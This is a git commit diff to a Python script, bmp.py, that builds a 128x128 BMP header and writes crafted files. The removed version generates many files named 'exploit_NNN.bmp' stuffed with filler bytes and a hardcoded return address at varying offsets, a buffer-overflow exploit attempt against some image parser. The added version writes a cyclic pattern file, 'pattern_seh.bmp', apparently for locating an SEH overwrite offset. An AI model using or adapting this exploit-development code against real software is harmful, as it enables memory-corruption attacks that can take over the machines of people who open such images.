0144355eedd007662b80736cc3f77a776d65309a
fenec_fox <66519677+atimevil@users.noreply.github.com>
2025-04-15 18:03:55 +0900

    Update bmp.py

--- bmp.py
+++ bmp.py
@@ -1,5 +1,4 @@
 import struct
-
 width = 128
 height = 128
 bpp = 24
@@ -9,26 +8,22 @@ file_size = 54 + pixel_data_size
 bmp_header = bytearray([
     0x42, 0x4D
 ])
-bmp_header += struct.pack('<I', file_size) 
-bmp_header += b'\x00\x00\x00\x00'           
-bmp_header += struct.pack('<I', 54)         
-bmp_header += struct.pack('<I', 40)        
-bmp_header += struct.pack('<I', width)      
-bmp_header += struct.pack('<I', height)     
-bmp_header += struct.pack('<H', 1)         
-bmp_header += struct.pack('<H', bpp)       
-bmp_header += b'\x00\x00\x00\x00'          
-bmp_header += struct.pack('<I', pixel_data_size) 
-bmp_header += b'\x00\x00\x00\x00' * 4    
+bmp_header += struct.pack('<I', file_size)
+bmp_header += b'\x00\x00\x00\x00'
+bmp_header += struct.pack('<I', 54)
+bmp_header += struct.pack('<I', 40)
+bmp_header += struct.pack('<I', width)
+bmp_header += struct.pack('<I', height)
+bmp_header += struct.pack('<H', 1)
+bmp_header += struct.pack('<H', bpp)
+bmp_header += b'\x00\x00\x00\x00'
+bmp_header += struct.pack('<I', pixel_data_size)
+bmp_header += b'\x00\x00\x00\x00' * 4
 
-for i in range(0x100, 0x200): 
-    offset = i
-    payload = (
-        b'A' * offset +
-        struct.pack('<I', 0x401040) +
-        b'A' * (pixel_data_size - offset - 4)
-    )
-    file_name = 'exploit_{:03d}.bmp'.format(offset)
-    with open(file_name, 'wb') as f:
-        f.write(bmp_header)
-        f.write(payload)
+pattern = b''
+for i in range(pixel_data_size):
+    pattern += bytes([0x41 + (i % 26)]) 
+
+with open('pattern_seh.bmp', 'wb') as f:
+    f.write(bmp_header)
+    f.write(pattern)
